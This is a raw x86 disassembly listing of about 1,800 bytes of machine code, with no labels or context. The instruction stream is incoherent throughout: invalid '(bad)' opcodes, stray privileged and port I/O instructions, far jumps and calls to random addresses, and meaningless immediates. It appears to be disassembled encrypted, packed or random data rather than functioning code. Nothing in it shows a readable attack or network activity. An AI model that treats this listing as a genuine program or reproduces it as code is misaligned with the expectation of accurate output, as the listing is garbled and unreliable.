  410bc5:	jp     0x410b5f
  410bc7:	cmp    al,0x8c
  410bc9:	jae    0x410bec
  410bcb:	mov    edi,0xee8ce975
  410bd0:	fwait
  410bd1:	mov    ds:0xc052a368,al
  410bd6:	enter  0xc4bc,0xd9
  410bda:	ds icebp 
  410bdc:	jns    0x410bbb
  410bde:	dec    ecx
  410bdf:	loope  0x410b78
  410be1:	sub    eax,0x6208c3fe
  410be6:	mul    BYTE PTR [ebp+0x260b5eb9]
  410bec:	shl    DWORD PTR [ebx-0xf],cl
  410bef:	or     eax,0x162f4be4
  410bf4:	icebp  
  410bf5:	sub    eax,ebp
  410bf7:	mov    DWORD PTR [edi-0x59],edi
  410bfa:	out    dx,eax
  410bfb:	inc    ecx
  410bfc:	retf   0xde7b
  410bff:	cmp    BYTE PTR [ecx],al
  410c01:	dec    ebx
  410c02:	mov    ?,WORD PTR [esi+edi*1+0x64bb449c]
  410c09:	mov    dl,0x96
  410c0b:	sbb    al,0x14
  410c0d:	jo     0x410bd7
  410c0f:	lea    esi,[ebx]
  410c11:	mov    BYTE PTR [edi],cl
  410c13:	or     edx,DWORD PTR [ecx]
  410c15:	pop    es
  410c16:	lods   ax,WORD PTR ds:[esi]
  410c18:	or     BYTE PTR ds:0x7a41a864,dh
  410c1e:	jle    0x410c80
  410c20:	test   al,0x59
  410c22:	inc    esi
  410c23:	scas   al,BYTE PTR es:[edi]
  410c24:	push   ecx
  410c25:	fiadd  DWORD PTR [ecx-0xc]
  410c28:	cmp    DWORD PTR [ebx],ecx
  410c2a:	cli    
  410c2b:	or     DWORD PTR [ebx-0x35],0x38049868
  410c32:	and    BYTE PTR [esi+0x66],cl
  410c35:	and    edi,esp
  410c37:	sub    eax,DWORD PTR [ebx]
  410c39:	and    cl,BYTE PTR [esi-0xc]
  410c3c:	imul   ebx,eax,0xffffffab
  410c3f:	jns    0x410c3e
  410c41:	cwde   
  410c42:	fiadd  WORD PTR [edi-0x4348f217]
  410c48:	ins    BYTE PTR es:[edi],dx
  410c49:	add    eax,0x4881e340
  410c4e:	pop    edi
  410c4f:	fsub   DWORD PTR [ebp+0x10]
  410c52:	pop    ebx
  410c53:	inc    edi
  410c54:	cld    
  410c55:	nop
  410c56:	mov    edi,0xaada15c0
  410c5b:	dec    ebx
  410c5c:	jns    0x410c63
  410c5e:	cmp    al,BYTE PTR [edx+0x3c]
  410c61:	jmp    FWORD PTR [ebx+0x3f37f28d]
  410c67:	fld    DWORD PTR [edx+0x1f]
  410c6a:	adc    cl,dh
  410c6c:	shl    DWORD PTR [edx-0x454142b3],0x6e
  410c73:	sub    DWORD PTR [ebx],eax
  410c75:	cdq    
  410c76:	add    eax,0xb1080762
  410c7b:	and    ch,BYTE PTR [edi-0x2b9cf65c]
  410c81:	mov    bh,0x20
  410c83:	shr    BYTE PTR [ebx+0x570d16f],0x9e
  410c8a:	lea    esp,[edi+eax*2+0x75ebe848]
  410c91:	push   ecx
  410c92:	aad    0x86
  410c94:	sub    eax,0x730d65a4
  410c99:	or     al,dh
  410c9b:	vmread DWORD PTR [edi+0x5d0ec7f4],edi
  410ca2:	push   ecx
  410ca3:	test   bl,bh
  410ca5:	bound  eax,QWORD PTR [ebx]
  410ca7:	retf   0x3a28
  410caa:	adc    ebx,DWORD PTR [edi-0x3e]
  410cad:	pop    eax
  410cae:	jmp    0x410cb7
  410cb0:	mov    eax,ds:0x31fc7343
  410cb5:	inc    ebp
  410cb6:	xor    bh,cl
  410cb8:	stc    
  410cb9:	test   eax,0x73dbbab3
  410cbe:	jae    0x410cfb
  410cc0:	inc    esp
  410cc1:	fisttp QWORD PTR [edi+0x35cda88e]
  410cc7:	cs pop esi
  410cc9:	and    eax,0x5e0e0fe1
  410cce:	sub    DWORD PTR [ecx+0x42],0x18
  410cd2:	stc    
  410cd3:	bound  ecx,QWORD PTR [edi+0x36a766f4]
  410cd9:	iret   
  410cda:	bound  ebx,QWORD PTR [esi-0x25]
  410cdd:	in     al,dx
  410cde:	mov    al,ds:0x86baa2c1
  410ce3:	or     BYTE PTR [esi-0x3e],dl
  410ce6:	loop   0x410cf5
  410ce8:	inc    edi
  410ce9:	jnp    0x410cc1
  410ceb:	adc    ebp,ebx
  410ced:	ret    0x12ef
  410cf0:	icebp  
  410cf1:	call   0xc0aba787
  410cf6:	fidivr DWORD PTR [edi]
  410cf8:	fld    TBYTE PTR [ecx-0x4b]
  410cfb:	test   ecx,ecx
  410cfd:	sbb    BYTE PTR [edx],cl
  410cff:	(bad)  
  410d00:	call   0x7ebbe48f
  410d05:	inc    ebp
  410d06:	hlt    
  410d07:	cmp    al,0x40
  410d09:	aam    0xa4
  410d0b:	jp     0x410d3c
  410d0d:	call   0x8e0069e
  410d12:	loope  0x410ce9
  410d14:	xlat   BYTE PTR ds:[ebx]
  410d15:	mov    al,ds:0xb8a074e7
  410d1a:	bound  edi,QWORD PTR [eax]
  410d1c:	adc    bl,ch
  410d1e:	jns    0x410d04
  410d20:	fisubr DWORD PTR [ebp+0x757fad9e]
  410d26:	pop    ecx
  410d27:	loopne 0x410d46
  410d29:	mov    eax,ds:0x7caffd29
  410d2e:	fs fmul st(4),st
  410d31:	addr16 (bad) 
  410d33:	cli    
  410d34:	jno    0x410cf7
  410d36:	sub    DWORD PTR [edx+0x64],ebp
  410d39:	sbb    DWORD PTR [eax+edi*4+0x31],ebp
  410d3d:	and    edx,DWORD PTR [edi+0x473ca051]
  410d43:	fmul   QWORD PTR [ecx-0x3a732576]
  410d49:	mov    dl,0x32
  410d4b:	jb     0x410d67
  410d4d:	repnz in eax,dx
  410d4f:	mov    ebx,0xbb2605a7
  410d54:	jb     0x410d71
  410d56:	sub    ah,BYTE PTR [ebp-0x41]
  410d59:	xor    eax,DWORD PTR [ebx+ebp*8+0xf]
  410d5d:	cmp    eax,0xfdf2996e
  410d62:	rcr    BYTE PTR [ebx],1
  410d64:	ror    bh,cl
  410d66:	sbb    al,dl
  410d68:	in     al,0x54
  410d6a:	popa   
  410d6b:	scas   al,BYTE PTR es:[edi]
  410d6c:	push   ebx
  410d6d:	repnz in al,dx
  410d6f:	sbb    BYTE PTR [ecx+0x14],ah
  410d72:	sub    al,0xe1
  410d74:	dec    ecx
  410d75:	mov    dh,0xa
  410d77:	fyl2xp1 
  410d79:	push   esi
  410d7a:	push   esp
  410d7b:	enter  0x847c,0xcc
  410d7f:	es and ecx,ebp
  410d82:	xchg   ebx,eax
  410d83:	pop    eax
  410d84:	test   BYTE PTR [edi-0x5d],bl
  410d87:	repnz xlat BYTE PTR ds:[ebx]
  410d89:	jl     0x410d16
  410d8b:	push   edi
  410d8c:	pop    esp
  410d8d:	xchg   esp,ebp
  410d8f:	jnp    0x410d2c
  410d91:	loop   0x410dd0
  410d93:	loope  0x410e11
  410d95:	(bad)  
  410d96:	in     al,0xa9
  410d98:	hlt    
  410d99:	inc    eax
  410d9a:	jb     0x410d43
  410d9c:	mov    edi,0x76da431a
  410da1:	pusha  
  410da2:	xchg   edx,eax
  410da3:	cmp    eax,0xf713031b
  410da8:	in     eax,dx
  410da9:	out    dx,eax
  410daa:	dec    edx
  410dab:	add    DWORD PTR [ebx-0x5f4cf929],ebx
  410db1:	and    BYTE PTR ds:0x3e2e,0xa6
  410db7:	pop    ebx
  410db8:	int    0x4e
  410dba:	aad    0x23
  410dbc:	stos   DWORD PTR es:[edi],eax
  410dbd:	xor    al,0xab
  410dbf:	jnp    0x410e2c
  410dc1:	push   ss
  410dc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410dc3:	jns    0x410dff
  410dc5:	out    dx,al
  410dc6:	sahf   
  410dc7:	(bad)  
  410dc8:	xlat   BYTE PTR ds:[ebx]
  410dc9:	xor    edx,DWORD PTR ds:0x338db99c
  410dcf:	adc    al,0x7d
  410dd1:	bound  esi,QWORD PTR [ebx+edi*2+0x63733464]
  410dd8:	fld    DWORD PTR [eax-0x4d]
  410ddb:	push   0xdf6b5269
  410de0:	xchg   edx,eax
  410de1:	jl     0x410d99
  410de3:	sbb    al,0x1
  410de5:	push   edx
  410de6:	retf   0x5e0a
  410de9:	adc    al,0xbb
  410deb:	cmp    DWORD PTR [edi],edi
  410ded:	sbb    esp,DWORD PTR [esp+edi*8+0x23f53980]
  410df4:	loope  0x410dc7
  410df6:	and    DWORD PTR [edx+ecx*8+0x6],esi
  410dfa:	mov    eax,ds:0x460e952d
  410dff:	sar    DWORD PTR [ebx],cl
  410e01:	mov    ds:0x562ff0ec,al
  410e06:	inc    edi
  410e07:	outs   dx,DWORD PTR ds:[esi]
  410e08:	jo     0x410e0d
  410e0a:	dec    ebp
  410e0b:	adc    al,0x63
  410e0d:	pop    es
  410e0e:	inc    esp
  410e0f:	mov    edx,0x56d7e616
  410e14:	jp     0x410e19
  410e16:	loop   0x410e4a
  410e18:	add    DWORD PTR [ebp+0x2d],edx
  410e1b:	xor    al,0x85
  410e1d:	(bad)  [ebp-0x54]
  410e20:	xor    esi,DWORD PTR [eax]
  410e22:	jge    0x410e26
  410e24:	sub    eax,0xb707b61b
  410e29:	fist   DWORD PTR [ebp-0x4cf9e226]
  410e2f:	loopne 0x410e5e
  410e31:	mov    ecx,0x78e1f6f9
  410e36:	les    ebp,FWORD PTR [edx-0x24]
  410e39:	bound  esp,QWORD PTR [esp+ebp*4-0x7c29096b]
  410e40:	int    0x8c
  410e42:	adc    dl,BYTE PTR [edi-0x4bc2aab7]
  410e48:	xchg   ecx,eax
  410e49:	mov    edi,0x4cb9fc39
  410e4e:	pop    ds
  410e4f:	fadd   DWORD PTR ds:0x82e69401
  410e55:	or     bl,BYTE PTR [ebp+0x7a9adec9]
  410e5b:	out    0x20,eax
  410e5d:	mov    eax,ds:0x3159438a
  410e62:	push   esp
  410e63:	inc    edi
  410e64:	mov    bh,0x5
  410e66:	jne    0x410e22
  410e68:	cmp    eax,0xceb4bae2
  410e6d:	cmp    eax,0x7d52bc14
  410e72:	cdq    
  410e73:	and    bl,dl
  410e75:	xor    al,0xf3
  410e77:	imul   ebx,edi,0xc
  410e7a:	js     0x410e87
  410e7c:	(bad)  
  410e7d:	xchg   esi,eax
  410e7e:	or     DWORD PTR [eax],edi
  410e80:	jnp    0x410e70
  410e82:	jmp    0x2e4bd8c4
  410e87:	push   esi
  410e88:	xchg   esi,eax
  410e89:	int    0x28
  410e8b:	mov    esp,0x9c42075d
  410e90:	mov    ch,0x69
  410e92:	push   esi
  410e93:	xchg   esp,eax
  410e94:	daa    
  410e95:	jbe    0x410e3e
  410e97:	push   ss
  410e98:	test   BYTE PTR gs:[edi+0x66425d15],dl
  410e9f:	sar    BYTE PTR [esi+0x5f],cl
  410ea2:	aam    0x37
  410ea4:	pusha  
  410ea5:	neg    ch
  410ea7:	hlt    
  410ea8:	pop    eax
  410ea9:	cs icebp 
  410eab:	jb     0x410e33
  410ead:	add    BYTE PTR [esi+0x33f436a0],bl
  410eb3:	scas   eax,DWORD PTR es:[edi]
  410eb4:	dec    ebp
  410eb5:	mov    edx,0x5797b8fc
  410eba:	(bad)  
  410ebb:	mov    bl,0xc
  410ebd:	pop    ds
  410ebe:	push   ecx
  410ebf:	add    eax,0x5f39eeaa
  410ec4:	mov    cl,al
  410ec6:	(bad)  
  410ec8:	adc    al,0x19
  410eca:	inc    eax
  410ecb:	and    eax,0x8cd457a3
  410ed0:	mov    esp,0x9178b662
  410ed5:	les    edi,FWORD PTR [eax]
  410ed7:	pusha  
  410ed8:	lods   al,BYTE PTR ds:[esi]
  410ed9:	js     0x410eb3
  410edb:	xchg   DWORD PTR [edx],ecx
  410edd:	mov    edx,eax
  410edf:	xchg   edi,eax
  410ee0:	mov    ?,WORD PTR [ebp-0x1809993e]
  410ee6:	in     eax,0x95
  410ee8:	adc    esp,DWORD PTR [ebx]
  410eea:	jne    0x410e7c
  410eec:	enter  0x57ca,0x22
  410ef0:	fcmovnu st,st(4)
  410ef2:	imul   ecx,DWORD PTR [edi+0x706c35b4],0x5f7e6e6b
  410efc:	adc    DWORD PTR [ebx+0x2e],edi
  410eff:	or     eax,0xf5cfc9ab
  410f04:	mov    ebx,0xb99c8272
  410f09:	adc    ebp,ecx
  410f0b:	push   esi
  410f0c:	inc    ebp
  410f0d:	test   DWORD PTR [esi],edi
  410f0f:	gs aaa 
  410f11:	lea    ecx,[ebx]
  410f13:	imul   edx,ebx,0xffffffa9
  410f16:	inc    esp
  410f17:	mov    ch,BYTE PTR [eax-0x73e4cfdc]
  410f1d:	jae    0x410ead
  410f1f:	jne    0x410f94
  410f21:	mov    dh,0xe2
  410f23:	mov    eax,0x9c1db9f0
  410f28:	gs mov esi,edx
  410f2b:	fisub  DWORD PTR [ebp*8+0x359b3e43]
  410f32:	sub    al,cl
  410f34:	and    dh,BYTE PTR [ecx+0x1e60d7a9]
  410f3a:	jmp    0x410ed6
  410f3c:	inc    ebp
  410f3d:	ret    0xd01f
  410f40:	pushf  
  410f41:	lahf   
  410f42:	aad    0x4b
  410f44:	fsub   st,st(7)
  410f46:	lahf   
  410f47:	and    eax,0x4baa0c78
  410f4c:	in     eax,0xf7
  410f4e:	call   0x38e7e0f3
  410f53:	jecxz  0x410fc7
  410f55:	mov    eax,ds:0x1103173
  410f5a:	push   cs
  410f5b:	fmul   st,st(5)
  410f5d:	aas    
  410f5e:	push   cs
  410f5f:	inc    edx
  410f60:	cmp    edi,DWORD PTR [edi+edi*4]
  410f63:	and    al,0xce
  410f65:	pop    ecx
  410f66:	dec    esi
  410f67:	mov    edx,0x97c273a1
  410f6c:	mul    BYTE PTR [ecx-0x5]
  410f6f:	mov    ds:0xadca8dfa,al
  410f74:	mov    esi,0xccf62ac1
  410f79:	jle    0x410fbb
  410f7b:	sub    BYTE PTR ds:0xbc0aaa25,bh
  410f81:	test   eax,0x4701dc3c
  410f86:	sub    al,0x69
  410f88:	xlat   BYTE PTR ds:[ebx]
  410f89:	push   ebx
  410f8a:	iret   
  410f8b:	inc    edi
  410f8c:	or     dh,BYTE PTR [eax+0x6746b618]
  410f92:	or     ah,BYTE PTR [edx-0x55]
  410f95:	cld    
  410f96:	call   FWORD PTR [ecx-0x1786be94]
  410f9c:	fwait
  410f9d:	sub    eax,0x2d760e84
  410fa2:	adc    eax,0xcd6af10e
  410fa7:	and    DWORD PTR [edx-0x4c],eax
  410faa:	(bad)  
  410fab:	adc    eax,0x1faec796
  410fb0:	jb     0x410f8e
  410fb2:	sub    esi,ecx
  410fb4:	jecxz  0x410f42
  410fb6:	jb     0x410f45
  410fb8:	dec    ecx
  410fb9:	ret    
  410fba:	jge    0x410fea
  410fbc:	sub    DWORD PTR [ebx-0x71588d4b],eax
  410fc2:	adc    eax,0x8a340e9e
  410fc7:	add    dl,BYTE PTR [edi+0x17]
  410fca:	jnp    0x410f93
  410fcc:	imul   ebx,DWORD PTR es:[ebp-0x1d],0xc5684ede
  410fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fd5:	(bad)  
  410fd6:	ret    
  410fd7:	pop    ebp
  410fd8:	dec    ebx
  410fd9:	lahf   
  410fda:	clc    
  410fdb:	jo     0x410fc9
  410fdd:	repz mov ch,0x67
  410fe0:	pop    ebp
  410fe1:	sub    al,0x89
  410fe3:	xchg   ebx,eax
  410fe4:	xchg   esi,eax
  410fe5:	outs   dx,DWORD PTR ds:[esi]
  410fe6:	cmp    al,0x4a
  410fe8:	out    dx,eax
  410fe9:	icebp  
  410fea:	xchg   BYTE PTR [esi-0x2f0a592d],bh
  410ff0:	test   DWORD PTR [esi+0x56],eax
  410ff3:	ins    DWORD PTR es:[edi],dx
  410ff4:	mov    BYTE PTR [edx],al
  410ff6:	xchg   ecx,eax
  410ff7:	call   FWORD PTR [eax+0x4b412fcf]
  410ffd:	int    0xcb
  410fff:	push   edi
  411000:	and    al,0x5
  411002:	std    
  411003:	fxch   st(5)
  411005:	enter  0x3f09,0x99
  411009:	lods   al,BYTE PTR ds:[esi]
  41100a:	xor    edi,ebx
  41100c:	ins    DWORD PTR es:[edi],dx
  41100d:	test   al,0x7e
  41100f:	lods   eax,DWORD PTR ds:[esi]
  411010:	in     eax,0xbe
  411012:	mov    bl,0x49
  411014:	sbb    al,0x40
  411016:	ds arpl WORD PTR gs:[edi+0x6dc6d39a],di
  41101e:	or     BYTE PTR [esp+ecx*8],cl
  411021:	loope  0x411099
  411023:	loope  0x411064
  411025:	sub    ah,BYTE PTR [eax]
  411027:	jb     0xe3c4bb6b
  41102d:	xor    BYTE PTR [ebx+0x53cb1349],0xd2
  411034:	push   ebp
  411035:	mov    eax,0x4f89b5a
  41103a:	(bad)  
  41103b:	cmp    al,0xf7
  41103d:	inc    esp
  41103e:	pop    ecx
  41103f:	push   edx
  411040:	int3   
  411041:	sbb    esi,0xffffff9d
  411044:	inc    ecx
  411045:	pop    esi
  411046:	out    dx,al
  411047:	retf   
  411048:	out    0x21,al
  41104a:	or     al,0xc9
  41104c:	sub    eax,0xbfbe3466
  411051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411052:	add    ecx,eax
  411054:	lahf   
  411055:	xor    dl,BYTE PTR [edx+0x4b]
  411058:	sbb    cl,ch
  41105a:	dec    edx
  41105b:	dec    edx
  41105c:	fild   WORD PTR [eax]
  41105e:	jo     0x411011
  411060:	stc    
  411061:	dec    ebp
  411062:	inc    eax
  411063:	leave  
  411064:	std    
  411065:	je     0x4110ce
  411067:	inc    esp
  411068:	or     esi,DWORD PTR [ebp+0x5cae0da2]
  41106e:	lds    edx,FWORD PTR [esp+eiz*8+0xcfcb849]
  411075:	mov    al,al
  411077:	xor    BYTE PTR [esi-0x4203a527],bl
  41107d:	sub    BYTE PTR [eax+0x6b25ac12],al
  411083:	data16 daa 
  411085:	push   0x428fb989
  41108a:	or     al,bl
  41108c:	adc    ebx,esi
  41108e:	popf   
  41108f:	xchg   ecx,eax
  411090:	je     0x411038
  411092:	mov    ds:0x2424272c,eax
  411097:	ins    DWORD PTR es:[edi],dx
  411098:	inc    edi
  411099:	cli    
  41109a:	outs   dx,DWORD PTR ds:[esi]
  41109b:	jl     0x4110b6
  41109d:	sub    edi,eax
  41109f:	and    BYTE PTR [edi-0x74],bl
  4110a2:	pop    eax
  4110a3:	mov    al,0x10
  4110a5:	test   al,0x4c
  4110a7:	push   edi
  4110a8:	or     edx,DWORD PTR [ebx]
  4110aa:	xlat   BYTE PTR ds:[ebx]
  4110ab:	inc    esi
  4110ac:	jecxz  0x4110d3
  4110ae:	or     edx,DWORD PTR [edi]
  4110b0:	loopne 0x411122
  4110b2:	ror    DWORD PTR [ebx],0x27
  4110b5:	push   ds
  4110b6:	out    dx,al
  4110b7:	fiadd  DWORD PTR [ebx+0x6b872d5b]
  4110bd:	jecxz  0x41104e
  4110bf:	mov    edi,0x311ce0c5
  4110c4:	pop    edi
  4110c5:	xchg   BYTE PTR [esi+0x6ff691b4],ch
  4110cb:	adc    esp,0xffffff81
  4110ce:	mov    BYTE PTR [edx+eiz*4+0x1e1a3166],ah
  4110d5:	ds push edx
  4110d7:	pop    esp
  4110d8:	xchg   esi,eax
  4110d9:	adc    eax,DWORD PTR [eax+0x247a2b8]
  4110df:	ins    BYTE PTR es:[edi],dx
  4110e0:	pop    esp
  4110e1:	mov    edx,0xa0cb2bea
  4110e6:	mov    esp,0x9578d1b6
  4110eb:	xchg   edi,eax
  4110ec:	xor    al,ah
  4110ee:	and    eax,0xa2550a95
  4110f3:	xlat   BYTE PTR ds:[ebx]
  4110f4:	cmp    ecx,DWORD PTR [ebx]
  4110f6:	mov    edi,0x5728a090
  4110fb:	dec    edx
  4110fc:	fbld   TBYTE PTR [ebx+0x65]
  4110ff:	or     eax,0x48251445
  411104:	jns    0x4110ed
  411106:	sbb    ebp,esp
  411108:	call   0x249f7d3a
  41110d:	xchg   edi,eax
  41110e:	stc    
  41110f:	inc    edx
  411110:	xchg   DWORD PTR [ebx-0x8396a0f],esp
  411116:	sbb    eax,0x59b784d8
  41111b:	xchg   ebx,eax
  41111c:	push   ebx
  41111d:	mov    DWORD PTR [esi],edx
  41111f:	fbstp  TBYTE PTR [edx-0x1f]
  411122:	or     esi,DWORD PTR [edx-0x7f0dfdb1]
  411128:	out    dx,al
  411129:	jl     0x411187
  41112b:	push   es
  41112c:	in     al,0x8e
  41112e:	(bad)  
  411130:	mov    WORD PTR [ecx+0x50],es
  411133:	sub    DWORD PTR [esi],0x53
  411136:	outs   dx,DWORD PTR ds:[esi]
  411137:	adc    dh,BYTE PTR [ebx+0x12fe0f88]
  41113d:	dec    ecx
  41113e:	push   esi
  41113f:	pop    esi
  411140:	test   eax,0xca83dc00
  411145:	dec    esp
  411146:	mov    ecx,0xdcfb82e8
  41114b:	test   eax,0x9bc150e9
  411150:	out    dx,eax
  411151:	push   0xffffffdb
  411153:	aam    0x44
  411155:	jae    0x4110dd
  411157:	push   esp
  411158:	bound  eax,QWORD PTR [ecx+0x6a]
  41115b:	mov    WORD PTR [eax],es
  41115d:	pop    ds
  41115e:	fnstsw WORD PTR [edi+0x37]
  411161:	sbb    dl,BYTE PTR [ebp+0x74841af3]
  411167:	aaa    
  411168:	js     0x4111e4
  41116a:	sar    BYTE PTR [ebx+0x4af870b9],0xb6
  411171:	xchg   esi,eax
  411172:	pop    ebx
  411173:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411174:	ret    
  411175:	pop    ds
  411176:	stos   BYTE PTR es:[edi],al
  411177:	mov    eax,0xb13fcfaa
  41117c:	(bad)  
  41117e:	ins    BYTE PTR es:[edi],dx
  41117f:	jnp    0x411191
  411181:	cld    
  411182:	mov    eax,0x2b18835b
  411187:	mov    ah,0x2d
  411189:	into   
  41118a:	cmp    ah,BYTE PTR [esi+0x52]
  41118d:	inc    esi
  41118e:	es push ebp
  411190:	pop    ecx
  411191:	int    0xf2
  411193:	fcmovbe st,st(6)
  411195:	retf   
  411196:	rol    ebp,1
  411198:	imul   edx,ebp,0x80babf17
  41119e:	bound  eax,QWORD PTR [edx+0x264ce4cc]
  4111a4:	call   0xa4d5:0x3faa277e
  4111ab:	mov    cl,0xf9
  4111ad:	sub    bh,0xe4
  4111b0:	sbb    al,0xeb
  4111b2:	cmc    
  4111b3:	int3   
  4111b4:	mov    dh,0x67
  4111b6:	and    DWORD PTR [esi-0x1d],ebp
  4111b9:	js     0x411230
  4111bb:	cli    
  4111bc:	jmp    0x41121e
  4111be:	pop    ebp
  4111bf:	xchg   esi,eax
  4111c0:	(bad)  
  4111c1:	fdiv   st,st(0)
  4111c3:	and    al,0x86
  4111c5:	pop    ss
  4111c6:	cmp    DWORD PTR [edx+0x1162aaaa],esp
  4111cc:	adc    eax,0xb02817de
  4111d1:	out    0x19,al
  4111d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111d4:	sti    
  4111d5:	dec    esi
  4111d6:	mov    ?,ebp
  4111d8:	jns    0x4111e2
  4111da:	leave  
  4111db:	int3   
  4111dc:	adc    eax,0x7ebacf35
  4111e1:	(bad)  
  4111e2:	xor    edx,DWORD PTR [eax+esi*8+0x7ca1e90]
  4111e9:	add    DWORD PTR [esi+0x43],edi
  4111ec:	adc    DWORD PTR [ecx-0x225ad13a],ebx
  4111f2:	dec    edx
  4111f3:	jne    0x41118f
  4111f5:	push   ds
  4111f6:	aas    
  4111f7:	scas   al,BYTE PTR es:[edi]
  4111f8:	pop    ebp
  4111f9:	dec    edi
  4111fa:	sub    DWORD PTR [esi],esp
  4111fc:	add    al,0x1b
  4111fe:	sbb    BYTE PTR [eax-0x55],bh
  411201:	mov    dh,0xcb
  411203:	ret    0x6b7
  411206:	jle    0x411191
  411208:	lea    ecx,[esi-0x51]
  41120b:	dec    ebx
  41120c:	clc    
  41120d:	xlat   BYTE PTR ds:[ebx]
  41120e:	in     eax,dx
  41120f:	jmp    0x41127d
  411211:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411212:	leave  
  411213:	xor    al,0x98
  411215:	or     BYTE PTR [ebx-0x79],dl
  411218:	dec    edx
  411219:	mov    edx,0x5060e9f1
  41121e:	add    ch,BYTE PTR [ebx+0xb]
  411221:	mov    ecx,0x27b5026e
  411226:	pop    ebp
  411227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411228:	inc    esi
  411229:	(bad)  
  41122a:	cwde   
  41122b:	sub    cl,BYTE PTR [ebx]
  41122d:	lea    esi,[ebx]
  41122f:	ja     0x4112a6
  411231:	sti    
  411232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411233:	je     0x411243
  411235:	mov    bh,0xe9
  411237:	mov    ebp,DWORD PTR [eax+0x52e845d9]
  41123d:	addr16 stc 
  41123f:	adc    BYTE PTR [esi+0x711e3df3],dh
  411245:	sbb    al,0x7d
  411247:	dec    ebx
  411248:	clc    
  411249:	arpl   WORD PTR [edi-0x2e2658d4],bp
  41124f:	jmp    0x540e:0xadcf4c41
  411256:	pushf  
  411257:	or     al,BYTE PTR [edx]
  411259:	cmp    ch,ch
  41125b:	sub    eax,0x9226012f
  411260:	stc    
  411261:	adc    bh,dh
  411263:	enter  0x4493,0x4f
  411267:	push   cs
  411268:	test   dl,dh
  41126a:	sub    eax,0x12bbcb04
  41126f:	add    BYTE PTR [ebx-0x79365ea6],cl
  411275:	addr16 mov al,0xec
  411278:	test   al,0xd2
  41127a:	jg     0x41126f
  41127c:	mov    edx,0x88b1488b
  411281:	shl    BYTE PTR [ebx-0x3e],0xf5
  411285:	sbb    al,0x48
  411287:	in     eax,0x7
  411289:	jg     0x41126b
  41128b:	mov    bl,0xc9
  41128d:	mov    dl,BYTE PTR [esi]
  41128f:	loop   0x411233
  411291:	arpl   WORD PTR [ebp+0x7],si
  411294:	sbb    edx,DWORD PTR [esi+ecx*2-0x2e002b3f]
  41129b:	pop    edi
  41129c:	test   eax,0x97a5fe71
  4112a1:	fmul   DWORD PTR [ecx+0x41c3883d]
  4112a7:	push   0xe014e520
  4112ac:	sbb    dl,BYTE PTR [esi+edx*4-0x77]
  4112b0:	mov    edx,0xbfe0158d
  4112b5:	mov    DWORD PTR [esi+esi*8+0x1b],eax
  4112b9:	mov    ds:0x1031ab95,al
  4112be:	(bad)
  4112c1:	cmp    DWORD PTR [edx+0x11],0xd33e65ef
  4112c8:	jno    0x411284
  4112ca:	pop    eax
  4112cb:	pop    es
  4112cc:	and    edx,DWORD PTR [edx-0x4c]
  4112cf:	xlat   BYTE PTR ds:[ebx]
  4112d0:	inc    ebx
  4112d1:	das    
  4112d2:	inc    esp
  4112d3:	loop   0x4112d3
  4112d5:	mul    BYTE PTR [edi-0x77]
  4112d8:	adc    edi,DWORD PTR [esi-0x3]
  4112db:	push   ss
  4112dc:	and    DWORD PTR [ebx-0x2b47bda3],esi
  4112e2:	neg    BYTE PTR [ebp+0x4e]
  4112e5:	xchg   esi,eax
  4112e6:	jae    0x41128a
  4112e8:	int3   
  4112e9:	mov    esp,0x3f16b282
  4112ee:	xchg   BYTE PTR [edi+ebx*2],ah
  4112f1:	cmp    BYTE PTR [ebp+0x1ced5f75],dh
  4112f7:	js     0x4112b9
  4112f9:	test   BYTE PTR [esi],cl
  4112fb:	xchg   edi,eax
  4112fc:	test   eax,0x6c6d99f
  411301:	scas   al,BYTE PTR es:[edi]
  411302:	or     edi,DWORD PTR [eax-0x63]
  411305:	aas    
  411306:	and    DWORD PTR [ebx+0x1d],0x6188fe03
  41130d:	xchg   edx,eax
  41130e:	fsub   DWORD PTR [edx]
  411310:	pop    esi
  411311:	call   0xde8f:0xf3e1078d
  411318:	scas   eax,DWORD PTR es:[edi]
  411319:	and    eax,0x71a60f92
  41131e:	arpl   WORD PTR [ebp-0x72],cx
  411321:	adc    dl,BYTE PTR [edi-0x67f86f91]
  411327:	loop   0x411300
  411329:	add    DWORD PTR [ebp-0x57],edi
  41132c:	add    BYTE PTR [ebx-0x17],dl
  41132f:	clc    
  411330:	or     eax,0xc9eb73b2
  411335:	push   ds
  411336:	add    al,0x8e
  411338:	xchg   ecx,eax
  411339:	out    0xb0,al
  41133b:	push   ebp
  41133c:	adc    ebp,esi
  41133e:	or     eax,0x3d0875ab
  411343:	or     BYTE PTR [eax+0x5ced5977],bl
  411349:	cdq    
  41134a:	push   0x4fb8277e
  41134f:	outs   dx,BYTE PTR ds:[esi]
  411350:	jo     0x4112f6
  411352:	out    0x67,al
  411354:	and    eax,DWORD PTR [ecx]
  411356:	icebp  
  411357:	loopne 0x411375
  411359:	xchg   ebp,eax
  41135a:	sub    dh,BYTE PTR [eax-0x61]
  41135d:	les    eax,FWORD PTR ds:0xfa182977
  411363:	push   esp
  411364:	mov    fs,WORD PTR [ebx+0x22]
  411367:	and    BYTE PTR [edx],dl
  411369:	and    eax,0x715a24d0
  41136e:	cmp    ebx,0xffffffd7
  411371:	popa   
  411372:	xlat   BYTE PTR ds:[ebx]
  411373:	test   al,0x32
  411375:	mov    edi,DWORD PTR [ebx+0x798b2e50]
  41137b:	xchg   edi,eax
  41137c:	xor    edi,DWORD PTR ds:0xbb386d56
  411382:	retf   0xdfa9
  411385:	pop    ebp
  411386:	mov    ebx,0xaba21ee6
  41138b:	pop    ds
  41138c:	mov    BYTE PTR ds:0xeb0bfbe6,ah
  411392:	inc    esp
  411393:	mov    BYTE PTR [ebx-0x34113f17],0xd
  41139a:	cmp    esp,edx
  41139c:	dec    ebx
  41139d:	into   
  41139e:	cs mov ecx,0x5303e8aa
  4113a4:	repnz xchg ebp,eax
  4113a6:	mov    ah,0xa2
  4113a8:	xchg   edx,eax
  4113a9:	xor    bh,dl
  4113ab:	arpl   WORD PTR ds:0x971ebaf,di
  4113b1:	iret   
  4113b2:	(bad)  
  4113b3:	ins    BYTE PTR es:[edi],dx
